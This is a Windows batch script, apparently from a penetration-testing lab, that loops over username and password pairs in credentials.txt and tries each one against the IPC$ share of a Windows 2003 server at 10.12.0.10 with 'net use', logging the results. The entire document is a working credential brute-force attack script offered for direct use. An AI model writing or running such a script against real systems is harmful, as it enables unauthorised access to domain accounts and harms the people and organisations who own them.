@echo off
REM FOR loop script to test credentials against Windows 2003 Server
REM Replace DOMAIN with your actual domain from: systeminfo | findstr /C:"Domain"

echo Starting credential testing... > output.txt
echo ================================ >> output.txt
echo. >> output.txt

FOR /F "tokens=1,2" %%A IN (credentials.txt) DO (
    echo [*] Trying username: %%A with password: %%B >> output.txt
    net use \\10.12.0.10\ipc$ %%B /user:DOMAIN\%%A >> output.txt 2>&1
    echo. >> output.txt
    net use \\10.12.0.10\ipc$ /delete /yes >> output.txt 2>&1
    echo -------------------------------- >> output.txt
)

echo. >> output.txt
echo Testing complete! >> output.txt
type output.txt
